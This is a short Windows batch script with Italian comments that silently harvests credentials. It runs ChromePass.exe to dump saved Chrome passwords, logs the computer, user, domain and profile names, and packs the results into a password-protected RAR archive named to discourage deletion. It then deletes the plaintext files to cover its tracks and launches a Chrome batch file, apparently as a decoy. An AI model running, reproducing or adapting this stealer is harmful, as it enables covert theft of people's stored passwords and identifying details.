@ChromePass.exe /sverhtml log.html

REM Scrittura del file di log
@echo COMPUTERNAME = %COMPUTERNAME% > log.txt
@echo USERNAME = %USERNAME% >> log.txt
@echo USERDOMAIN = %USERDOMAIN% >> log.txt
@echo USERPROFILE = %USERPROFILE% >> log.txt
@echo. >> log.txt
@echo Oggi e’ %DATE% e sono le %TIME% >> log.txt
REM Compressione
@Winrar.exe a -plorehack dontdel%random%.rar *.html log.txt > nul
REM Eliminazione e celamento dei file usati
@del *.html
@del log.txt

@start chrome.bat


